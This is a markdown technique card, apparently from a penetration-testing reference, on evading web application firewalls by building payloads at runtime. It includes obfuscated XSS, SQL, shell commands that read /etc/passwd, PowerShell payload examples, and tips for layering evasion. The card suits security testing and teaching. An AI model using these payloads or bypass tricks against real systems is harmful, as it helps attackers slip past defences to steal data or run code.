---
id: WAF-EVASION-09
title: Dynamic Payload Generation
category: Evasion Techniques
severity_range: Low-Critical
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-09: Dynamic Payload Generation

## Summary

Dynamic payload generation constructs malicious code at runtime using string concatenation, character code conversion, or other runtime transformations. Since the WAF inspects the static request content rather than the dynamically generated result, payloads that are assembled from fragments or decoded at runtime can bypass signature-based detection.

## When to Use

- Against WAFs that match static strings but cannot evaluate dynamic code generation
- When the backend application uses `eval()`-like functions that execute dynamically constructed code
- For XSS where JavaScript can reassemble strings from character codes
- Against WAFs with limited request body inspection depth or partial parsing

## Technique Details

**String concatenation** splits keywords into fragments that are joined at runtime. The WAF sees individual substrings that may not match any signature.

**Character code conversion** uses functions like `String.fromCharCode()` in JavaScript or `CHAR()` in SQL to build strings from numeric character codes.

**Base64/encoding reversal** embeds encoded strings that are decoded and executed at runtime.

## Payload Examples

```javascript
// JavaScript string concatenation
"al" + "er" + "t(1)"
"do" + "cument" + ".cookie"
"win" + "dow" + ".loc" + "ation"

// String.fromCharCode()
String.fromCharCode(97,108,101,114,116,40,49,41)
// Evaluates to: alert(1)

// eval with concatenation
eval("al"+"ert(1)")

// Combined approach
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// Using atob (base64 decode)
eval(atob("YWxlcnQoMSk="))
// Decodes base64 'alert(1)' and executes

// Template literals (ES6+)
eval(`aler${"t"}(1)`)

// Constructor trick
[].constructor.constructor("alert(1)")()
```

```sql
-- SQL dynamic generation
SELECT CHAR(97,108,101,114,116)  -- 'alert' (MySQL)

-- Dynamic SQL via CONCAT
EXEC('SELECT ' + CHAR(42) + ' FROM users')  -- MSSQL

-- Using UNHEX
SELECT UNHEX('61646D696E')  -- 'admin'
```

```bash
# Shell command concatenation
c""at /etc/passwd
c''at /etc/passwd
c$@at /etc/passwd
"ca"t /etc/passwd
```

```powershell
# PowerShell dynamic generation
& ("Ge`t-`It`em") "C:\users"
$c="Ge"+'t-ChildItem'; & $c "C:\"
[String]::Join('',@("Ge","t-","Co","ntent")) "C:\file.txt"
```

## Detection & Bypass Notes

**Detection:**
- WAFs with behavioral analysis or sandboxing can detect dynamic generation by observing the decoded output.
- Some WAFs emulate JavaScript execution to detect obfuscated payloads.
- High-entropy string fragments combined with `eval()` or `fromCharCode()` are strong indicators.

**Bypass:**
- Nest multiple layers of dynamic generation: `eval(atob(eval(encoded_string)))`.
- Combine with character encoding (Unicode, hex) for additional obfuscation.
- Use dynamic property access in JavaScript: `window['al' + 'ert'](1)`.
- Distribute fragments across different parts of the request (headers, body, cookies).

## References

- https://github.com/0xInfection/Awesome-WAF
- https://jsfuck.com/
- https://github.com/aemkei/jjencode
- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode
